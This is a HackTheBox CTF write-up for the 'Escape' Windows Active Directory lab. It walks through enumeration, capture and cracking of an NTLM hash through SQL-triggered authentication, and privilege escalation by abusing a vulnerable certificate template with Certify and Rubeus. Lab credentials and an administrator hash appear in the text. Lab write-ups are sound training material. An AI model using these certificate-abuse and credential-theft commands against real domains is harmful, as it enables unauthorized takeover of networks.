---
title: "[AD] Escape"
date: 2025-12-25
draft: false
description: "HackTheBox [AD] Escape writeup"
tags: ["hackthebox", "htb", "windows", "medium", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# [AD] Escape

## Overview

- **OS:** Windows
- **IP:** 10.129.228.253
- **Difficulty:** Medium
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Got Access via leaked user creds, ntlm poisioning of service account hash, priv esc with a vuln certificate template.

## Loot

| **Rough** |  |  |
| --- | --- | --- |
| **Usernames** | Brandon, Tom, Ryan |  |
| **Credentials** | PublicUser:GuestUserCantWrite1

**Takeaways**

sequel\sql_svc:REGGIE1234ronnie

sequel.htb\Ryan.Cooper:NuclearMosquito3

administrator:A52F78E4C751E5F5E17E1E9F3E58F4EE
 |  |
## Enumeration
- nmap

```
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 13:36 EST
        Nmap scan report for 10.129.228.253
        Host is up (0.19s latency).
        Not shown: 987 filtered tcp ports (no-response)
        PORT     STATE SERVICE       VERSION
        53/tcp   open  domain        Simple DNS Plus
        88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-26 02:37:16Z)
        135/tcp  open  msrpc         Microsoft Windows RPC
        139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
        389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
        | ssl-cert: Subject: 
        | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
        | Not valid before: 2024-01-18T23:03:57
        |_Not valid after:  2074-01-05T23:03:57
        |_ssl-date: 2025-12-26T02:38:45+00:00; +7h59m59s from scanner time.
        445/tcp  open  microsoft-ds?
        464/tcp  open  kpasswd5?
        593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
        636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
        | ssl-cert: Subject: 
        | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
        | Not valid before: 2024-01-18T23:03:57
        |_Not valid after:  2074-01-05T23:03:57
        |_ssl-date: 2025-12-26T02:38:45+00:00; +8h00m00s from scanner time.
        1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
        | ms-sql-info: 
        |   10.129.228.253:1433: 
        |     Version: 
        |       name: Microsoft SQL Server 2019 RTM
        |       number: 15.00.2000.00
        |       Product: Microsoft SQL Server 2019
        |       Service pack level: RTM
        |       Post-SP patches applied: false
        |_    TCP port: 1433
        | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
        | Not valid before: 2025-12-26T02:28:16
        |_Not valid after:  2055-12-26T02:28:16
        | ms-sql-ntlm-info: 
        |   10.129.228.253:1433: 
        |     Target_Name: sequel
        |     NetBIOS_Domain_Name: sequel
        |     NetBIOS_Computer_Name: DC
        |     DNS_Domain_Name: sequel.htb
        |     DNS_Computer_Name: dc.sequel.htb
        |     DNS_Tree_Name: sequel.htb
        |_    Product_Version: 10.0.17763
        |_ssl-date: 2025-12-26T02:38:45+00:00; +7h59m59s from scanner time.
        3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
        |_ssl-date: 2025-12-26T02:38:45+00:00; +7h59m59s from scanner time.
        | ssl-cert: Subject: 
        | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
        | Not valid before: 2024-01-18T23:03:57
        |_Not valid after:  2074-01-05T23:03:57
        3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
        | ssl-cert: Subject: 
        | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
        | Not valid before: 2024-01-18T23:03:57
        |_Not valid after:  2074-01-05T23:03:57
        |_ssl-date: 2025-12-26T02:38:45+00:00; +8h00m00s from scanner time.
        5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-title: Not Found
        |_http-server-header: Microsoft-HTTPAPI/2.0
        Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
        Device type: general purpose
        Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
        OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
        Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
        No exact OS matches for host (test conditions non-ideal).
        Network Distance: 2 hops
        Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
        
        Host script results:
        | smb2-time: 
        |   date: 2025-12-26T02:38:04
        |_  start_date: N/A
        |_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
        | smb2-security-mode: 
        |   3:1:1: 
        |_    Message signing enabled and required
        
        TRACEROUTE (using port 445/tcp)
        HOP RTT       ADDRESS
        1   192.44 ms 10.10.14.1
        2   192.55 ms 10.129.228.253
        
        OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 109.19 seconds
```

- ssl

```
        Connecting to 10.129.228.253
        CONNECTED(00000003)
        depth=0 
        verify error:num=20:unable to get local issuer certificate
        verify return:1
        depth=0 
        verify error:num=21:unable to verify the first certificate
        verify return:1
        depth=0 
        verify return:1

        Certificate chain
         0 s:
           i:DC=htb, DC=sequel, CN=sequel-DC-CA
           a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
           v:NotBefore: Jan 18 23:03:57 2024 GMT; NotAfter: Jan  5 23:03:57 2074 GMT

        Server certificate
        -----BEGIN CERTIFICATE-----
        MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
        ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
        MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwIBcNMjQwMTE4MjMwMzU3WhgPMjA3NDAx
        MDUyMzAzNTdaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCvfUDG
        vZbf6oLv67FXEoeqi+VUDMwFcCWGOpwAlEvMCRhMa2Jqx6nVSl+7URU0rF43c58A
        kAFbwX9E5B4Me4ZDkqkHV5nBBkHEPdDP4ZlYsjAmVrz7bHAzp3coDgF9UKv9S4j8
        g9P8MPaOdxTRR6dwkhVWdIDvIevjeg7oWTawG7MFEX4b7BEwL/uNRYZtyFHrfmzP
        BL5MovrBbZzU4AnggnvpeiLNdenK9Xcp2IIDr8A7h7uFuQ+3pCbXL9El/vEgzxAj
        rsUhf2e6nxNAWrNZSFXLHREt9uFkhTWU26Zoa675Vjq0XNy7J+rXAZiU5q3eD4Kq
        /SiN+ZDAwWJ22XGJAgMBAAGjggK8MIICuDA4BgkrBgEEAYI3FQcEKzApBiErBgEE
        AYI3FQiHq/N2hdymVof9lTWDv8NZg4nKNYF3ASECAW4CAQIwMgYDVR0lBCswKQYI
        KwYBBQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB
        /wQEAwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMB
        MAwGCisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUCVbgZp4lOmGws1z7
        bP3InfTiHiMwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
        HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
        LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
        Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
        Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
        MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
        cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
        U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
        dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
        MC8GA1UdEQEB/wQlMCOCDWRjLnNlcXVlbC5odGKCCnNlcXVlbC5odGKCBnNlcXVl
        bDANBgkqhkiG9w0BAQsFAAOCAQEAK2aJVbODF+3XQ85GflrcPthxILDslZoJff13
        ULw9IQRwFbr5wV/usQR8WXfp4FGWB7g6F3w4vOo8Wnm0eTcQM+N2Ry3aEWiv9SG8
        /Vk18Z1sSU2hzlTdZbVJWgZwCyPvYoV02uPkP12f+Z9groRTtOEBq0AgdMDc5hZ/
        A8Ikn9UuctvkX6qgw+ofyVveIqsE0GL6DCDGw6iUmXIgVJk5fgQnfyQquqnmhVnA
        8NoXXuh0ioTHmCqYrdtIcB8KC4nS70p3ef2F2fTNejqtw46M04VZQw/67Y+83hI5
        I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
        -----END CERTIFICATE-----
        subject=
        issuer=DC=htb, DC=sequel, CN=sequel-DC-CA

        No client certificate CA names sent
        Client Certificate Types: RSA sign, DSA sign, ECDSA sign
        Requested Signature Algorithms: RSA+SHA256:RSA+SHA384:RSA+SHA1:ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA1:DSA+SHA1:RSA+SHA512:ECDSA+SHA512
        Shared Requested Signature Algorithms: RSA+SHA256:RSA+SHA384:RSA+SHA1:ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA1:DSA+SHA1:RSA+SHA512:ECDSA+SHA512
        Peer signing digest: SHA256
        Peer signature type: rsa_pkcs1_sha256
        Peer Temp Key: ECDH, secp384r1, 384 bits

        SSL handshake has read 1979 bytes and written 1849 bytes
        Verification error: unable to verify the first certificate

        New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
        Protocol: TLSv1.2
        Server public key is 2048 bit
        Secure Renegotiation IS supported
        Compression: NONE
        Expansion: NONE
        No ALPN negotiated
        SSL-Session:
            Protocol  : TLSv1.2
            Cipher    : ECDHE-RSA-AES256-GCM-SHA384
            Session-ID: 4D2800008BDCD71818F7B113163933B092C8E59CAB994B5994CE3EA667FE9534
            Session-ID-ctx: 
            Master-Key: 795202876F2CD0C474ACB69F447AE7D1E481E249E96F7313C6E3AC60A5D7E31066A0410CDB79416BE5D7CC1822DD6F2E
            PSK identity: None
            PSK identity hint: None
            SRP username: None
            Start Time: 1766689379
            Timeout   : 7200 (sec)
            Verify return code: 21 (unable to verify the first certificate)
            Extended master secret: yes
```

- smb

{{< figure src="image 236.png" >}}

{{< figure src="image 237.png" >}}

{{< figure src="image 238.png" >}}

{{< figure src="image 239.png" >}}

- SQL server

{{< figure src="image 240.png" >}}

{{< figure src="image 241.png" >}}

{{< figure src="image 242.png" >}}

Lets try to do ntlm poisioning where we will try to get the server to connect to us, which will give us the identity that we will try and crack

{{< figure src="image 243.png" >}}

{{< figure src="image 244.png" >}}

We capture this

```
        [+] Listening for events...                                                                              
        
        [SMB] NTLMv2-SSP Client   : 10.129.228.253
        [SMB] NTLMv2-SSP Username : sequel\sql_svc
        [SMB] NTLMv2-SSP Hash     : sql_svc::sequel:b7114adaff3f6874:AE56E5B5586110E928824C4A231B6E2A:010100000000000080923BF6B275DC01595E6647EC95B6F80000000002000800550056003800340001001E00570049004E002D00310053004D004D0048004E0037005A0043005200510004003400570049004E002D00310053004D004D0048004E0037005A004300520051002E0055005600380034002E004C004F00430041004C000300140055005600380034002E004C004F00430041004C000500140055005600380034002E004C004F00430041004C000700080080923BF6B275DC010600040002000000080030003000000000000000000000000030000060EE7AF5E672E9B3997DD99397B112593890FA2639AC35A2DDBFCCB3DAE08ABB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320038000000000000000000  
```

on cracking with hashcat

{{< figure src="image 245.png" >}}

## Vulnerabilities
## Exploitation

now that we got the user account creds that was running the sql service, lets try to get in through it with evil winrm

we find this in the sqlserver path

{{< figure src="image 246.png" >}}

{{< figure src="image 247.png" >}}

Lets try getting in with these creds and then grabbing the user flag

{{< figure src="image 248.png" >}}

- **Priv-Esc**


Lets start off with getting Bloodhound on 

{{< figure src="image 249.png" >}}

now lets check our applocker policies

{{< figure src="image 250.png" >}}

{{< figure src="image 251.png" >}}

Tells us that there are no rules being enforced and we can create a new machine

idt we can dump creds

{{< figure src="image 252.png" >}}

damn what about privesc check

{{< figure src="image 253.png" >}}

nothing useful

lets check certify

it gives us this which is a vulnerable template

{{< figure src="image 254.png" >}}

lets request a cert now

./cert.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

```
    [*] cert.pem         :
    
    -----BEGIN RSA PRIVATE KEY-----
    MIIEogIBAAKCAQEAmsMuQLppjYVgw4//mpj/P/Q+0iISV1slIWtyn2pg+dtyU3NE
    gSYqlvxcy68tOFbT38N4iFRaeLjYgyYZncKxhkIMbUThTCMOMdQm87mNdPwuP5NB
    NZdP7TinW3Yj61ahN8c61XxzNr6kjVo2440wjVpFCFkChbyi3E0Xd2YeqQ4bhwqi
    m6CNn+RzpUgw5+nE5DsCTyY/jC80ak2BheI7Dj1PACsEKKumVqU1ILn+gjpRSZvs
    zD/BZMg6nbmrNhe88r/ws4ToyLQqGUCNx0tey37MVrToN4pELJ44CjJf16g9qvwR
    qEcm6VZacro+Xa5ZMqmJo74MVsYsZT5AP/0uLQIDAQABAoIBADluz35j74H+im9o
    xAGaX7dbK+kNjeLvRzNEza/NaZmvz5iagUSwZkPL+Z/5LX3n8w7qWpO1QjHk3yyk
    egMq2nipkDUIx9dadw0U3zO5m35bi8o6GowJ0DaHvMvbZu8SIhgyDmplmdgqHaT7
    Yr1Fi0wZwN6dMatx2rqIvXmo4x33M4l+7o/b7JHMTNj4xzoO1u10mvK6pxXYp0j2
    PWxJA2einj231nDt0CQZUr4BxUnIbbY1pw4CbvSjS1cs3cPUOWagrWUvI+hOdZmV
    T25dsGd0BJX1DWtbjyJndnj8bMgsu5Z/0bNt/xnfmYxnh74LhXhm7wFwyKh3tEMA
    xw//4N0CgYEAy0HUvkApkB49269QXe57ubP9xP9ZQglaxKnMCWmkiyLgy2K9EWIN
    fpHoDa0p/GIfkNoPT/4TL1wY37MbMlPrMjk/Z8q9+mhsCOeAwfxAd3GZz8zGbV18
    tQzQfJjaZqRcL+kuOVGXh0p16HuP2ysDEBlaNrRPjgs4PY3pH1VKk/MCgYEAwuvk
    ufCvZNo86t7N9elVyB1JehL50mxhgMbAqZum9bWt3ASwBIOxCb01Pt43RaHxuiUj
    Ub+01sG00XxQ7bwJ8N6NaGAPr2JviiBchAqmNHu7Em7SGSAKL4SdQFPJvVgJmzjz
    6kL2tbHbqXfq11hRQJLeeMA29+CAnCyHU2lrXV8CgYAHQqm7xgT2De59u2xufodS
    4dgNwmVI05a3ca1FJM3o3m0TNsq0JUGAJOwaGPZn+oVQIknrvJKo3WxSCU7OZGsB
    V0Qpi/dvS22Yf9R8mWsgGSG6Z4ErBOzgdr23xan/gp18ZKLvDzgPcBx4GnnQBWBN
    oeo0DArPcx0mLbyHDv/j+wKBgArLHy5AqqWuBAOJdOQyGILtRD1TQawqPjfwSYja
    yqL+fXMae1i0piAA7yrdCTh84DLLjaogMHZX4ZhcBuszJ2XEHRZzg0rV65E9e4IA
    SPXNCC3cHxwvDwFUmZSPTzOB5X5H6BHHxXuILr6ymjl0dYNa3qDXG/Qb5WNAf/nZ
    c42HAoGAL3lc7J4mSTf47W0y/PI7WSqrjYVxUKUDL8+x+jjoB2mRZtgKH2PEklI7
    5C2dnQ2BE/e/LJVkUfgs2i3Q/qmR6pMO6pnevV4DV8NwU7OKWZ8zWwj4KEDVR/Sq
    3ZuP4nvrBEPW1JPD7w/AXrNl7R4NaEt0VOJemoPUZxd2Rwo7vS8=
    -----END RSA PRIVATE KEY-----
    -----BEGIN CERTIFICATE-----
    MIIGEjCCBPqgAwIBAgITHgAAAA7IG3/8jzhppQAAAAAADjANBgkqhkiG9w0BAQsF
    ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
    MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUxMjI2MjM1NjUxWhcNMzUxMjI0
    MjM1NjUxWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
    c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
    MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCawy5AummNhWDDj/+amP8/9D7S
    IhJXWyUha3KfamD523JTc0SBJiqW/FzLry04VtPfw3iIVFp4uNiDJhmdwrGGQgxt
    ROFMIw4x1CbzuY10/C4/k0E1l0/tOKdbdiPrVqE3xzrVfHM2vqSNWjbjjTCNWkUI
    WQKFvKLcTRd3Zh6pDhuHCqKboI2f5HOlSDDn6cTkOwJPJj+MLzRqTYGF4jsOPU8A
    KwQoq6ZWpTUguf6COlFJm+zMP8FkyDqduas2F7zyv/CzhOjItCoZQI3HS17LfsxW
    tOg3ikQsnjgKMl/XqD2q/BGoRybpVlpyuj5drlkyqYmjvgxWxixlPkA//S4tAgMB
    AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
    lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
    KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
    CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
    hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
    Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIVI3t82owCTX23c+/KlYh3gML5r
    MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
    IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
    gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
    bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
    bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
    ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
    gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
    QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
    bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
    b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
    AAOCAQEASsm0sZtW1s0P3jLMuFrW8UxwrES9hH8GLDNT6vs05PyU9Ib84nW3BmYy
    YigNZaH4erDi4QU6yniPlj8n/SMEXvKT3vntsswDvMZoX4IzX6qw1uHUDsNNxY+7
    9tgtnnhtueuQoqfif0d9xmSezrAj5Ovk7ohYUzwessK6Ldy5uSEesrscGKMllIiv
    3vn8i0Vv0/CJdFmp6u5dofGEs9WQr80JfrRxJ3ih+Ne6fdaHfoxLXDHbqmj/o4XM
    v0zY6YoBKhfNzz1/CUg8QZjZTlHfFZWJh6u67//h3V05bUsGmHl4F82QgLjixL1k
    hQA5BYlWSgdWM6ChUN2gRCoXF1VPTQ==
    -----END CERTIFICATE-----
    
    [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    
```

with this cert we request for a ticket in the name of administrator using rubeus

{{< figure src="image 255.png" >}}

if we dump the hash aswell with 

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>  .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap

we get this

{{< figure src="image 256.png" >}}

and we are in with the ntlm hash that we got

{{< figure src="image 257.png" >}}
